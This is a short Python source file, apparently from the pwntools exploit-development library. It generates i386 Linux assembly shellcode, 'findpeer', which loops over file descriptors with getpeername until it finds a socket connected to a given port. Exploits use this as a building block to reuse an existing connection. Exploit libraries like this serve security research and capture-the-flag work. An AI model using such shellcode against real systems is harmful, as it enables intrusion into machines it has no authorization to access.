from pwn import *

@shellcode_reqs(arch='i386', os='linux', network=['ipv4', 'ipv6'])
def findpeer(port = None):
    """Args: port (defaults to any port)
    Finds a remote socket, which is connected to the specified port.
    Leaves socket in ESI."""

    code = """
findpeer:
    push -1
    push SYS_socketcall_getpeername
    mov ebp, esp
    pop ebx
    pop esi

.loop:
    push SYS_socketcall
    pop eax

    inc esi
    lea ecx, [esp-32]

    push 4
    pushad

    int 0x80
"""

    if port == None:
        return code + """
    test eax, eax
    popad
    pop edx
    jnz .loop
"""

    else:
        return code + """
    popad
    pop edx
    shr eax, 16
    cmp ax, 0x%04x
    jne .loop
""" % htons(int(port))
